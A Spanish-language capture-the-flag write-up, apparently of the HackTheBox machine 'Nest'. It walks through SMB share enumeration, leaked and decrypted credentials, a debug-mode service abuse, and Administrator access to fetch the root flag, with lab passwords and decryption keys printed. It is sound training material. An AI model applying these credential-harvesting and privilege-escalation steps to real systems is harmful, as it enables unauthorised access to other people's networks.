# Nest

## Initial Scan

```
445/tcp  open  microsoft-ds?
4386/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     Reporting Service V1.2
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     Reporting Service V1.2
|     Unrecognised command
|   Help: 
|     Reporting Service V1.2
|     This service allows users to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS ---
|     LIST
|     SETDIR <Directory_Name>
|     RUNQUERY <Query_ID>
|     DEBUG <Password>
|_    HELP <Command>
```
## Enum 
### SMB 
Listamos los shares
```
smbclient -NL 10.10.10.178

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Data            Disk      
	IPC$            IPC       Remote IPC
	Secure$         Disk      
	Users           Disk   
```

Accedemos a Data
```IT
smbclient  \\\\10.10.10.178\\Data
  IT                                  D        0  Thu Aug  8 00:58:07 2019
  Production                          D        0  Mon Aug  5 23:53:38 2019
  Reports                             D        0  Mon Aug  5 23:53:44 2019
  Shared                              D        0  Wed Aug  7 21:07:51 2019
```
Solo podemos entrar dentro de Shared
```
  Maintenance                         D        0  Wed Aug  7 21:07:32 2019
  Templates                           D        0  Wed Aug  7 21:08:07 2019
```
Dentro de Maintenance encontramos un archivo
```
  Maintenance Alerts.txt              A       48  Tue Aug  6 01:01:44 2019
```
Dentro de Template teambien encontramso cosas, primero dos carpetas
```
  HR                                  D        0  Wed Aug  7 21:08:01 2019
  Marketing                           D        0  Wed Aug  7 21:08:06 2019
```
Dentro de la de HR encontramos un archivo que parece interesante
```
  Welcome Email.txt                   A      425  Thu Aug  8 00:55:36 2019
```
Lo descargamos mediante mget
```
We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location: 
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019
```
Gracias a esto podemos listar varios usuarios
```
  Administrator                       D        0  Fri Aug  9 17:08:23 2019
  C.Smith                             D        0  Sun Jan 26 08:21:44 2020
  L.Frost                             D        0  Thu Aug  8 19:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 19:02:50 2019
  TempUser                            D        0  Thu Aug  8 00:55:56 2019
```
Tambien podemso descargar mas archivos de la carpeta de IT dentro de data y un documento de texto de Users/TempUser

Dentro de IT encontramos un archivo llamado RU_config.xml con credenciales
```
  <Username>c.smith</Username>C
```
En el notepadplusplus vemos que se ha accedido al siguiente archivo
```
        <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
```
Veamos si podemos acceder a la carpeta de Carl dentro de IT y sacamos varios archivos .vb , reverseandolos un poco encotramos que module.vb usa utils.vb para desencriptar la conntraseña 
```
Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
```
Con esto podemos ver que la contraseña encriptada era: **xRxRxPANCAK3SxRxRx**, esto nos permite acceder a la carpeta de C.Smith y descargarnos su contenido usando de nuevo smbget
```
smbget -rR smb://10.10.10.178/Users/C.Smith -U C.Smith
smb://10.10.10.178/Users/C.Smith/HQK Reporting/AD Integration Module/HqkLdap.exe                                                                   
smb://10.10.10.178/Users/C.Smith/HQK Reporting/Debug Mode Password.txt                                                                             
smb://10.10.10.178/Users/C.Smith/HQK Reporting/HQK_Config_Backup.xml                                                                               
smb://10.10.10.178/Users/C.Smith/user.txt 
```
## Privesc
En el debug mode password.txt encontramos lo siguiente
```
WBQ201953D8w
```
Esta contraseñas puede ser usada en el otro servicio de la maquina para activar el debug mode que ofrece features extra
```
telnet 10.10.10.178 4386
>DEBUG WBQ201953D8w
>setdir ..

Current directory set to HQK
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]   HqkSvc.exe
[2]   HqkSvc.InstallState
[3]   HQK_Config.xml
>setdir LDAP
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf
>showquery 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
```
Analizando el .exe que tiene al lado vemos que posee la siguiente instrucción
```.NET
Decrypt(EncryptedString, "667912", "1313Rf99", 3,"1L1SA61493DRV53Z", 256);
```
Si se aplica a la Password tenemos una password legible: **XtH4nkS4Pl4y1nGX**
```
 smbclient  \\\\10.10.10.178\\C$ -U Administrator
smb: \> cd Users\Administrator\Desktop\
smb: \Users\Administrator\Desktop\> dir
    desktop.ini                       AHS      282  Sat Jan 25 23:02:44 2020
    root.txt                            A       32  Tue Aug  6 00:27:26 2019
smb: \Users\Administrator\Desktop\> mget root.txt
```
